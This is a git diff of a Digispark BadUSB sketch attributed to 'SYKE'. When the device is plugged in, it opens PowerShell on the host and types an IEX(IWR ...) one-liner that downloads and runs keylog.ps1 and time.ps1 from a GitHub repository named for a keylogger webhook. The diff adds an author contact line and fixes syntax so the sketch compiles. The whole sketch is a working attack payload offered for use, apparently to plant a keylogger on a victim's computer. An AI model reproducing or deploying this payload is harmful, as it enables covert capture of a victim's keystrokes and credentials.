@@ -1,4 +1,5 @@
 #MADE BY SYKE
+#discord: syke#116
 
 #include "DigiKeyboard.h"
 void setup() {
@@ -9,8 +10,8 @@ DigiKeyboard.delay(200);
 DigiKeyboard.print("powershell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(300);
-DigiKeyboard.print("cd $env:temp")
-DigiKeyboard.delay(300)
+DigiKeyboard.print("cd $env:temp");
+DigiKeyboard.delay(300);
 DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/keylog.ps1 -UseBasicParsing); Invoke-keylog.ps1;IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/time.ps1 -UseBasicParsing); Invoke-time.ps1;");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
